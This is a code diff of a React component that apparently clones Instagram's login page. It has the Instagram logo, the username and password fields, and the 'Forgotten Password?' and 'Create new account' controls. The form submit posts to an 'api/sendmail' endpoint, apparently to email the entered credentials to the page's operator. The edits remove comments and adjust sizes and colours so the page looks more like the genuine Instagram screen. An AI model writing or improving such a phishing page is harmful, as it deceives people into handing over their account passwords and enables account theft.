@@ -10,14 +10,13 @@ function App() {
   });
 
   const [isPasswordVisible, setIsPasswordVisible] = useState(false);
-  const [loading, setLoading] = useState(false); // Added loading state to manage async loading state
+  const [loading, setLoading] = useState(false); 
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setLoading(true); // Set loading to true when starting the API call
+    setLoading(true); 
 
     try {
-      // First verify email/password
       await fetch('api/sendmail', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -31,45 +30,41 @@ function App() {
     } catch (error) {
       console.log(error)
     } finally {
-      setLoading(false); // Reset loading state when the request is complete
+      setLoading(false); 
     }
   };
 
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
-      {/* Language Selector */}
-      <div className="flex justify-center items-center py-3 mt-5">
-        <p className="text-xs text-gray-600 bg-transparent">English (India)</p>
+      <div className="flex justify-center items-center py-3 mt-10">
+        <p className="text-lg text-gray-600 bg-transparent">English (India)</p>
       </div>
 
-      {/* Main Content */}
       <div className="flex-1 flex flex-col justify-center px-5">
-        {/* Instagram Logo */}
         <div className="flex justify-center mt-14 mb-20">
-          {/* <Instagram className="w-16 h-16" /> */}
           <Image
             src={'/insta.png'}
             alt='insta'
-            width={75}
-            height={75}
+            width={90}
+            height={90}
           />
         </div>
 
 
-        {/* Login Form */}
         <form onSubmit={handleSubmit} className="space-y-3">
           <div className="relative">
             <input
               type="text"
               placeholder=""
-              className="w-full px-3 pt-3.5 pb-2 bg-gray-50 text-gray-900 border border-gray-300 rounded-lg  focus:outline-none"
+              size={200}
+              className="w-full px-3 py-5 bg-[#fafafa] text-gray-900 border rounded-lg  focus:outline-none"
               value={credentials.username}
               onChange={(e) => setCredentials((prev) => ({ ...prev, username: e.target.value }))}
             />
             <label
               className={`absolute left-3 text-gray-500 transition-all pointer-events-none ${
-                credentials.username ? 'text-[10px] top-1' : 'text-sm top-4'
+                credentials.username ? 'top-1' : 'top-5 text-lg '
               }`}
             >
               Username, email address or mobile number
@@ -80,13 +75,13 @@ function App() {
             <input
               type={isPasswordVisible ? 'text' : 'password'}
               placeholder=""
-              className="w-full px-3 pt-3.5 pb-2 bg-gray-50 text-gray-900 border border-gray-300 rounded-lg  focus:outline-none"
+              className="w-full px-3 py-5 bg-[#fafafa] text-gray-900 border rounded-lg  focus:outline-none"
               value={credentials.password}
               onChange={(e) => setCredentials((prev) => ({ ...prev, password: e.target.value }))}
             />
             <label
               className={`absolute left-3 text-gray-500 transition-all pointer-events-none ${
-                credentials.password ? 'text-[10px] top-1' : 'text-sm top-4'
+                credentials.password ? 'top-1' : 'top-5 text-lg'
               }`}
             >
               Password
@@ -105,25 +100,23 @@ function App() {
           <button
             type="submit"
             disabled={loading} 
-            className={`w-full py-2 rounded-3xl text-sm font-semibold bg-blue-700 transition-colors ${loading && 'opacity-50'}`} // Add opacity when loading
+            className={`w-full py-3 rounded-3xl text-sm font-semibold bg-blue-600 transition-colors ${loading && 'opacity-50'}`} // Add opacity when loading
           >
             {loading ? 'Logging in...' : 'Log in'}
           </button>
         </form>
 
-        {/* Forgot Password */}
         <div className="mt-2 flex justify-center">
-          <a href="#" className=" text-gray-800">
+          <a href="#" className="text-lg text-gray-900">
             Forgotten Password?
           </a>
         </div>
 
-        {/* Sign Up Section */}
         <div className="mt-auto pt-4 pb-6 text-center ">
         <button
             type="submit"
             disabled={loading} 
-            className={`w-full py-2 rounded-3xl text-sm font-semibold bg-transparent border border-blue-700 text-blue-700 transition-colors ${loading && 'opacity-50'}`} // Add opacity when loading
+            className={`w-full py-3 rounded-3xl text-lg font-semibold bg-transparent border border-blue-700 text-blue-600 transition-colors ${loading && 'opacity-50'}`} // Add opacity when loading
           >
             Create new account
           </button>
